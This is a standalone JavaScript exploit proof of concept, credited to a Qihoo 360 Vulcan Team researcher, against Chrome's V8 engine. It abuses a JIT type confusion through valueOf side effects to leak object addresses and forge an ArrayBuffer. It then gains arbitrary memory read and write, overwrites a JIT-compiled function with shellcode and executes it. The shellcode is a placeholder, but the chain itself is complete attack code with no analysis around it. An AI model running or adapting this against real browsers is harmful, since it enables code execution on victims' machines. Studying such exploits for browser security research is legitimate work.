<script>
	/* author:Qixun Zhao Of Qihoo 360 Vulcan Team
		weibo:老实敦厚的大宝
		twitter:@S0rryMybad
	*/
	var shellcode = [0xcccccccc,0x90909090];
	var ab = new ArrayBuffer(0x20);
	//test_obj = ut32.__proto__;
	flag = 0;
	function gc(){
		for(var i=0;i<0x100000/0x10;i++){
			new String;
		}
	}
	function d2u(num1,num2){
		d = new Uint32Array(2);
		d[0] = num2;
		d[1] = num1;
		f = new Float64Array(d.buffer);
		return f[0];
	}
	function u2d(num){
		f = new Float64Array(1);
		f[0] = num;
		d = new Uint32Array(f.buffer);
		return d[1] * 0x100000000 + d[0];
	}
	function change_to_float(intarr,floatarr){
		var j = 0;
		for(var i = 0;i < intarr.length;i = i+2){
			var re = d2u(intarr[i+1],intarr[i]);
			floatarr[j] = re;
			j++;
		}
	}
	

	
	
	var smi_arr = [1];
	smi_arr.evil = 1;
	
	var double_arr = [1.1,2.2];
	double_arr.evil = 1;
	
	var obj_arr = [{}];
	obj_arr.evil = 1;
	
	var array = [smi_arr,double_arr,obj_arr];
	
	var double_arr_2 = [1.1,2.2];
	double_arr_2.evil = 1;
	
	var vauleOf = {};
	valueOf.valueOf = function(){
		if(flag == 1){
			array[0x1] = double_arr_2;
			
		}
		return 1;
	};
	function read_obj_addr(object){
		function carry_me_plz(arr,obj){
			for(var i = 0;i < arr.length;i++){
				var o = arr[i];
				o[0] = obj;
			}
		}
		function sorry(){
			1 + valueOf;
			double_arr_2[0] = 1.1;
			carry_me_plz(array,object);
			return double_arr_2[0];
		}
		for(var i = 0;i < 0x10000;i++){
			carry_me_plz(array,object);
		}
		for(var i = 0;i < 0x10000;i++){
			sorry();
		}
		flag = 1;
		re = u2d(sorry());
		return re;
	}
	
	//alert(addr);
	var nop = 0xdaba0000;
	var ab_map_obj = [
		nop,nop,
		0x1f000008,0x000900c0,0x082003ff,0x0,
		nop,nop,   // use ut32.prototype replace it
		nop,nop,0x0,0x0
	]
	ab_proto_addr = read_obj_addr(ab.__proto__);
	ab_constructor_addr = ab_proto_addr - 0x70;
	//alert(ab_proto_addr.toString(16));
	ab_map_obj[0x6] = ab_proto_addr & 0xffffffff;
	ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
	ab_map_obj[0x8] = ab_constructor_addr & 0xffffffff;
	ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
	float_arr = [];
	/*for(var i = 0;i < 0x100;i++){
		float_arr[i] = [1.1,1.1,1.1,1.1,1.1,1.1];
	}*/
	gc();
	var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
	change_to_float(ab_map_obj,ab_map_obj_float);
	
	//alert(u2d(ut32_map_obj_float[0x3]).toString(16));
	
	flag = 0;
	var smi_arr2 = [1];
	smi_arr2.evil = 1;
	
	var double_arr2 = [1.1,2.2];
	double_arr2.evil = 1;
	
	var obj_arr2 = [{}];
	obj_arr2.evil = 1;
	
	var array2 = [smi_arr2,double_arr2,obj_arr2];
	
	var double_arr22 = [1.1,2.33];
	double_arr22.evil = 1;
	
	var valueOf2 = {};
	valueOf2.valueOf = function(){
		if(flag == 1){
			array2[0x1] = double_arr22;
			
		}
		return 1;
	};
	function read_obj_addr2(object){
		function carry_me_plz(arr,obj){
			for(var i = 0;i < arr.length;i++){
				var o = arr[i];
				o[0] = obj;
			}
		}
		function sorry(){
			1 + valueOf2;
			double_arr22[0] = 1.1;
			carry_me_plz(array2,object);
			return double_arr22[0];
		}
		for(var i = 0;i < 0x10000;i++){
			carry_me_plz(array2,object);
		}
		for(var i = 0;i < 0x10000;i++){
			sorry();
		}
		flag = 1;
		re = u2d(sorry());
		return re;
	}
	ab_map_obj_addr = read_obj_addr2(ab_map_obj_float) + 0x40;
	//alert(ab_map_obj_addr.toString(16));
	
	
	var fake_ab = [
		ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
		ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
		ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
		0x0,0x4000, /* buffer length */
		0x12345678,0x123,/* buffer address */
		0x4,0x0
	]
	var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
	change_to_float(fake_ab,fake_ab_float);
	
	flag = 0;
	var smi_arr3 = [1];
	smi_arr3.evil = 1;
	
	var double_arr3 = [1.1,2.2];
	double_arr3.evil = 1;
	
	var obj_arr3 = [{}];
	obj_arr3.evil = 1;
	
	var array3 = [smi_arr3,double_arr3,obj_arr3];
	
	var double_arr32 = [1.1,2.33];
	double_arr32.evil = 1;
	
	var valueOf3 = {};
	valueOf3.valueOf = function(){
		if(flag == 1){
			array3[0x1] = double_arr32;
			
		}
		return 1;
	};
	function read_obj_addr3(object){
		function carry_me_plz(arr,obj){
			for(var i = 0;i < arr.length;i++){
				var o = arr[i];
				o[0] = obj;
			}
		}
		function sorry(){
			1 + valueOf3;
			double_arr32[0] = 1.1;
			carry_me_plz(array3,object);
			return double_arr32[0];
		}
		for(var i = 0;i < 0x10000;i++){
			carry_me_plz(array3,object);
		}
		for(var i = 0;i < 0x10000;i++){
			sorry();
		}
		flag = 1;
		re = u2d(sorry());
		return re;
	}
	fake_ab_float_addr = read_obj_addr3(fake_ab_float) + 0x40;
	//alert(fake_ab_float_addr.toString(16));
	
	
	
	flag = 0;
	var smi_arr4 = [1];
	smi_arr4.evil = 1;
	
	var double_arr4 = [1.1,2.2];
	double_arr4.evil = 1;
	
	var obj_arr4 = [{}];
	obj_arr4.evil = 1;
	
	var array4 = [smi_arr4,double_arr4,obj_arr4];
	
	var double_arr42 = [1.1,2.33];
	double_arr42.evil = 1;
	
	var valueOf4 = {};
	valueOf4.valueOf = function(){
		if(flag == 1){
			array4[0x1] = double_arr42;
			
		}
		return 1;
	};
	fake_ab_float_addr_f = d2u(fake_ab_float_addr / 0x100000000,fake_ab_float_addr & 0xffffffff).toString();
	function carry_me_plz_fake(arr){
		for(var i = 0;i < arr.length;i++){
			var o = arr[i];
			ttt = o[0];
		}
	}
	eval('function sorry_fake(){1 + valueOf4;double_arr42[0] = 1.1;carry_me_plz_fake(array4);double_arr42[1] = '+fake_ab_float_addr_f+';}')
	for(var i = 0;i < 0x1000;i++){
		carry_me_plz_fake(array3);
	}
	for(var i = 0;i < 0x1000;i++){
		sorry_fake();
	}
	flag = 1;
	sorry_fake();
	fake_arraybuffer = double_arr42[1];
	fake_dv = new DataView(fake_arraybuffer,0,0x4000);
	//Read32(0xdaba0,1);
	//alert(fake_ab_float[4]);
	
	
	var func_body = "eval('');";
	/*for(var i=0;i < 0x1000;i++){
		func_body += "a[" + i.toString() + "];";
	}*/
	var function_to_shellcode = new Function("a",func_body);
	flag = 0;
	var smi_arr5 = [1];
	smi_arr5.evil = 1;
	
	var double_arr5 = [1.1,2.2];
	double_arr5.evil = 1;
	
	var obj_arr5 = [{}];
	obj_arr5.evil = 1;
	
	var array5 = [smi_arr5,double_arr5,obj_arr5];
	
	var double_arr52 = [1.1,2.33];
	double_arr52.evil = 1;
	
	var valueOf5 = {};
	valueOf5.valueOf = function(){
		if(flag == 1){
			array5[0x1] = double_arr52;
			
		}
		return 1;
	};
	function read_obj_addr5(object){
		function carry_me_plz(arr,obj){
			for(var i = 0;i < arr.length;i++){
				var o = arr[i];
				o[0] = obj;
			}
		}
		function sorry(){
			1 + valueOf5;
			double_arr52[0] = 1.1;
			carry_me_plz(array5,object);
			return double_arr52[0];
		}
		for(var i = 0;i < 0x1000;i++){
			carry_me_plz(array5,object);
		}
		for(var i = 0;i < 0x1000;i++){
			sorry();
		}
		flag = 1;
		re = u2d(sorry());
		return re;
	}
	shellcode_address_ref = read_obj_addr5(function_to_shellcode) + 0x38-1;
	//alert(shellcode_address_ref.toString(16));
	
	/**************************************  And now,we get arbitrary memory read write!!!!!!   ******************************************/
	
	function Read32(addr){
		fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
		//fake_dv = new DataView(fake_arraybuffer,0,0x4000);
		//alert(fake_ab_float[4]);
		return fake_dv.getUint32(0,true);
	}
	function Write32(addr,value){
		fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
		//fake_dv = new DataView(fake_arraybuffer,0,0x4000);
		//alert(fake_ab_float[4]);
		alert("write");		
		fake_dv.setUint32(0,value,true);
	}
	//alert(shellcode_address_ref.toString(16));
	shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) * 0x100000000;;
	//shellcode_address = Read32(0xdaba0) + Read32(shellcode_address_ref+0x4) * 0x100000000;
	//alert(shellcode_address.toString(16));
	
	var addr = shellcode_address;
	
	fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
	for(var i = 0; i < shellcode.length;i++){
		//alert("write");
		var value = shellcode[i];		
		fake_dv.setUint32(i * 4,value,true);
	}
	alert("go to shellcode plz,chrome!");
	function_to_shellcode();
</script>